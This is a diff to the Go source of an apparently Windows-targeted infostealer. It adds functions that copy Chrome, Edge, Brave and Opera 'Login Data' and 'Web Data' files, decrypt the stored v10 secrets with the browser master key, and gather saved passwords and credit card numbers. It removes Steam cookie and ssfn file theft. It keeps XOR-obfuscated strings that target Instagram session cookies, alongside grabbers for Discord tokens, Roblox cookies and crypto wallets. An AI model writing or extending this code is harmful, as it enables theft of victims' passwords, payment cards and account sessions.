@@ -82,12 +82,25 @@ type SystemReport struct {
 	DiscordTokens []TokenInfo `json:"discord_tokens"`
 	RobloxCookies []string    `json:"roblox_cookies"`
 	InstaCookies  []string    `json:"insta_cookies"`
-	SteamCookies  []string    `json:"steam_cookies"`
-	SteamFiles    []string    `json:"steam_files"`
+	Passwords     []Password  `json:"passwords"`
+	CreditCards   []Card      `json:"credit_cards"`
 	RawCookies    []Cookie    `json:"raw_cookies"`
 	WalletsFound  []string    `json:"wallets_found"`
 	Browsers      []string    `json:"browsers_found"`
 	Timestamp     string      `json:"timestamp"`
+}
+
+type Password struct {
+	URL      string `json:"url"`
+	Username string `json:"user"`
+	Password string `json:"pass"`
+}
+
+type Card struct {
+	Number string `json:"number"`
+	Month  string `json:"month"`
+	Year   string `json:"year"`
+	Name   string `json:"name"`
 }
 
 type TokenInfo struct {
@@ -211,8 +224,8 @@ func initSession() SystemReport {
 	report.DiscordTokens = extractDiscordTokens()
 	report.RobloxCookies = extractRobloxCookies()
 	report.InstaCookies = extractInstagramCookies()
-	report.SteamCookies = extractSteamCookies()
-	report.SteamFiles = extractSteamFiles()
+	report.Passwords = extractPasswords()
+	report.CreditCards = extractCreditCards()
 	report.WalletsFound = extractWallets()
 	report.Browsers = findBrowsers()
 
@@ -602,39 +615,106 @@ func extractRobloxCookiesFromDat() []string {
 	return results
 }
 
-func extractInstagramCookies() []string {
-	target := d("\x31\x27\x31\x31\x2b\x2d\x2c\x2b\x26")                                       // sessionid XOR 0x42
-	return ultimateGrabber(d("\x2b\x2c\x31\x36\x23\x25\x30\x23\x2f\x6c\x21\x2d\x2f"), target) // instagram.com XOR 0x42
-}
-
-func extractSteamCookies() []string {
-	target := d("\x31\x36\x27\x23\x2f\x0e\x2d\x25\x2b\x2c\x11\x27\x21\x37\x30\x27")                       // steamLoginSecure XOR 0x42
-	return ultimateGrabber(d("\x31\x36\x27\x23\x2f\x32\x2d\x35\x27\x30\x27\x26\x6c\x21\x2d\x2f"), target) // steampowered.com XOR 0x42
-}
-
-func extractSteamFiles() []string {
-	var found []string
-	steamPaths := []string{
-		`C:\Program Files (x86)\Steam`,
-		`C:\Program Files\Steam`,
+func extractPasswords() []Password {
+	var results []Password
+	home, _ := os.UserHomeDir()
+	paths := []string{
+		filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
+		filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
+		filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
+		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
+		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
 	}
 
-	for _, steamPath := range steamPaths {
-		if _, err := os.Stat(steamPath); err == nil {
-			files, _ := os.ReadDir(steamPath)
-			for _, file := range files {
-				if strings.HasPrefix(file.Name(), "ssfn") {
-					fullPath := filepath.Join(steamPath, file.Name())
-					data, err := os.ReadFile(fullPath)
-					if err == nil {
-						sendAsFileCustom(data, file.Name(), "🎮 **Steam Guard File (ssfn) Captured**")
-						found = append(found, file.Name())
+	for _, basePath := range paths {
+		masterKey, _ := getMasterKey(basePath)
+		if masterKey == nil {
+			continue
+		}
+
+		profiles := []string{"Default", "Guest Profile", "."}
+		for i := 1; i <= 10; i++ {
+			profiles = append(profiles, fmt.Sprintf("Profile %d", i))
+		}
+
+		for _, profile := range profiles {
+			path := filepath.Join(basePath, profile, "Login Data")
+			if _, err := os.Stat(path); err == nil {
+				temp := filepath.Join(os.TempDir(), fmt.Sprintf("phantom_p_%d", time.Now().UnixNano()))
+				if copyFile(path, temp) != nil {
+					continue
+				}
+				content, _ := os.ReadFile(temp)
+				os.Remove(temp)
+
+				v10Matches := regexp.MustCompile(`v10[\x00-\xff]{20,}`).FindAll(content, -1)
+				for _, match := range v10Matches {
+					decrypted, err := decryptToken(match, masterKey)
+					if err == nil && len(decrypted) > 0 {
+						results = append(results, Password{
+							URL:      "Browser",
+							Username: "Unknown",
+							Password: decrypted,
+						})
 					}
 				}
 			}
 		}
 	}
-	return found
+	return results
+}
+
+func extractCreditCards() []Card {
+	var results []Card
+	home, _ := os.UserHomeDir()
+	paths := []string{
+		filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
+		filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
+		filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
+		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
+		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
+	}
+
+	for _, basePath := range paths {
+		masterKey, _ := getMasterKey(basePath)
+		if masterKey == nil {
+			continue
+		}
+
+		profiles := []string{"Default", "Guest Profile", "."}
+		for i := 1; i <= 10; i++ {
+			profiles = append(profiles, fmt.Sprintf("Profile %d", i))
+		}
+
+		for _, profile := range profiles {
+			path := filepath.Join(basePath, profile, "Web Data")
+			if _, err := os.Stat(path); err == nil {
+				temp := filepath.Join(os.TempDir(), fmt.Sprintf("phantom_w_%d", time.Now().UnixNano()))
+				if copyFile(path, temp) != nil {
+					continue
+				}
+				content, _ := os.ReadFile(temp)
+				os.Remove(temp)
+
+				v10Matches := regexp.MustCompile(`v10[\x00-\xff]{20,}`).FindAll(content, -1)
+				for _, match := range v10Matches {
+					decrypted, err := decryptToken(match, masterKey)
+					if err == nil && len(decrypted) > 0 {
+						results = append(results, Card{
+							Number: decrypted,
+							Name:   "Browser Card",
+						})
+					}
+				}
+			}
+		}
+	}
+	return results
+}
+
+func extractInstagramCookies() []string {
+	target := d("\x31\x27\x31\x31\x2b\x2d\x2c\x2b\x26")                                       // sessionid XOR 0x42
+	return ultimateGrabber(d("\x2b\x2c\x31\x36\x23\x25\x30\x23\x2f\x6c\x21\x2d\x2f"), target) // instagram.com XOR 0x42
 }
 
 func ultimateGrabber(domain string, targetCookie string) []string {
